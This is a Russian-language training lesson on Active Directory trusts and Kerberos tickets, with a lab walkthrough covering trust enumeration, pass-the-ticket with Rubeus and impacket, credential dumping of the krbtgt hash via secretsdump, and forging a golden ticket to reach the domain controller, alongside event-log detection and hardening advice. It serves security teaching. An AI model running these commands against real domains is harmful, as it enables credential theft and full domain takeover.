# 11.6 — Trusts и тикеты

> **M11 · Этап 2 · 5 ч · 🔴 · артефакт:** `labs/m11-ad-attacks/l06-trusts/`

## Цель

Понять, как доверия между доменами и леса расширяют периметр, и научиться работать с Kerberos-тикетами: извлекать, импортировать, подделывать в рамках лабы.

## Результат

- Карта доверий и направлений.
- Рабочий pass-the-ticket между доменами.
- Понимание SID History, krbtgt и golden/silver ticket.

## Теория

### 1. Виды доверий

- **Parent-child** (внутри леса) — двунаправленное, транзитивное.
- **Tree-root** — между деревьями леса.
- **External** — между доменами разных лесов, не транзитивное.
- **Forest trust** — между лесами, транзитивное в пределах леса.
- **Realm trust** — с Kerberos-реалмом.

Ключевой вопрос: **какие SID фильтруются** (`SID filtering`) и включён ли `Selective Authentication`.

### 2. Инвентаризация

```powershell
Get-DomainTrust
Get-ForestTrust
Get-DomainTrustMapping
```

```bash
nxc ldap 10.10.10.10 -u alice -p 'Password123!' --trusts
```

### 3. SID History

Атрибут `sIDHistory` позволяет пользователю из доверенного домена «притвориться» пользователем другого домена. Если SID filtering выключен — можно добавить SID DA чужого домена.

```powershell
Get-DomainUser -Properties samaccountname,sidhistory | ? { $_.sidhistory }
```

### 4. Тикеты

- **TGT** — `krbtgt`-ключом домена, даёт доступ к сервисам домена.
- **TGS** — ключом сервисного аккаунта, даёт доступ к сервису.
- **Golden ticket** — подделка TGT при известном `krbtgt`-хэше. Живёт до смены пароля `krbtgt` дважды.
- **Silver ticket** — подделка TGS при известном хэше сервисного аккаунта. Не требует DC.
- **Diamond/sapphire** — модификации с легитимными полями, сложнее детект.

### 5. Практика с тикетами

```bash
# экспорт на Windows
Rubeus.exe dump /nowrap
# конвертация kirbi → ccache
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=/path/ticket.ccache
impacket-psexec -k -no-pass dc01.lab.local
```

### 6. Детект

- 4768/4769 с аномальными полями (`Ticket Options`, `Transited Services`).
- 4624 type 3 с `Authentication Package: Kerberos`.
- Golden ticket: TGT без соответствующего 4768, аномально долгий срок, несоответствие `Domain SID`.
- Смена `krbtgt` — признак реакции.

## Лаборатория

> Два домена: `lab.local` и `partner.local` с forest trust. `alice@lab.local` имеет доступ к `partner.local` через trust.

### 1. Карта

```powershell
Get-DomainTrust | select SourceName,TargetName,TrustDirection,TrustType
Get-DomainTrustMapping
```

Ожидаемо: `lab.local → partner.local`, направление и тип.

### 2. SID History

```powershell
Get-DomainUser -Properties samaccountname,sidhistory -Server partner.local |
  ? { $_.sidhistory } | select samaccountname,sidhistory
```

Ожидаемо: пользователь с SID из `lab.local`.

### 3. Pass-the-ticket

```powershell
# на WIN01
Rubeus.exe asktgt /user:alice /password:'Password123!' /domain:lab.local /ptt
Rubeus.exe dump /nowrap
```

На Linux:

```bash
impacket-ticketConverter alice.kirbi alice.ccache
export KRB5CCNAME=$PWD/alice.ccache
impacket-smbclient -k -no-pass dc01.lab.local
```

Ожидаемо: доступ без пароля.

### 4. Cross-domain

Запросите TGS к `partner.local` с тикетом `lab.local`:

```bash
impacket-getST -spn cifs/files.partner.local lab.local/alice:'Password123!' -dc-ip 10.10.10.10
```

Ожидаемо: либо доступ, либо ошибка `SID filtering` — зафиксируйте, что именно.

### 5. Golden ticket (в лабе)

```bash
impacket-secretsdump -just-dc-user krbtgt lab.local/administrator:'Pass!'@10.10.10.10
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain lab.local administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass dc01.lab.local
```

Ожидаемо: доступ. После лабы смените `krbtgt` дважды.

### 6. Детект

Соберите 4768/4769 за время лабы, найдите аномалии. Сравните с baseline.

## Атака и защита

- **Атака:** trust → доступ к чужому домену; krbtgt → golden ticket.
- **Детект:** аномальные 4768/4769, TGT без 4768, SID History, cross-domain 4624.
- **Фикс:** SID filtering, selective authentication, аудит trusts, ротация `krbtgt` (дважды), `Protected Users`, мониторинг аномальных тикетов.

## Самопроверка

- [ ] Чем forest trust отличается от external?
- [ ] Что делает SID filtering?
- [ ] Почему golden ticket требует смены `krbtgt` дважды?
- [ ] Чем silver ticket обходится без DC?
- [ ] Какой лог покажет cross-domain доступ?

## Дальше

[Контрольная M11](exam.md)
